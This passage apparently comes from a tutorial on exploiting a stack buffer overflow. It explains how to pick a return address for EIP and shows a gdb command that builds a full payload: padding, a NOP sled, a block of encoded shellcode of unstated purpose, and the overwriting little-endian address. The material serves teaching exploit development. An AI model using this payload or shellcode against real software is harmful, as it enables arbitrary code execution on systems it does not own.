Here, we now have to choose an address to which we refer the EIP and which reads and executes one byte after the other starting at this address. In this example, we take the address 0xffffd64c. Illustrated, it then looks like this:

After selecting a memory address, we replace our "\x66" which overwrites the EIP to tell it to jump to the 0xffffd64c address. Note that the input of the address is entered backward.

```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\xf9\xbf\x0e\x77\xda\xdb\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x12\x31\x72\x12\x03\x72\x12\x83\x3b\xbb\xec\x82\x8a\x1f\x07\x8f\xbf\xdc\xbb\x3a\x3d\x6a\xda\x0b\x27\xa1\x9d\xff\xfe\x89\xa1\x32\x80\xa3\xa4\x35\xe8\x39\x5d\xc9\x51\x55\x63\xd5\xdb\xcf\xea\x34\xab\x76\xbd\xe7\x98\xc5\x3e\x81\xff\xe7\xc1\xc3\x97\x99\xee\x90\x0f\x0e\xde\x79\xad\xa7\xa9\x65\x63\x6b\x23\x88\x33\x80\xfe\xcb" + "\x4c\xd6\xff\xff"')
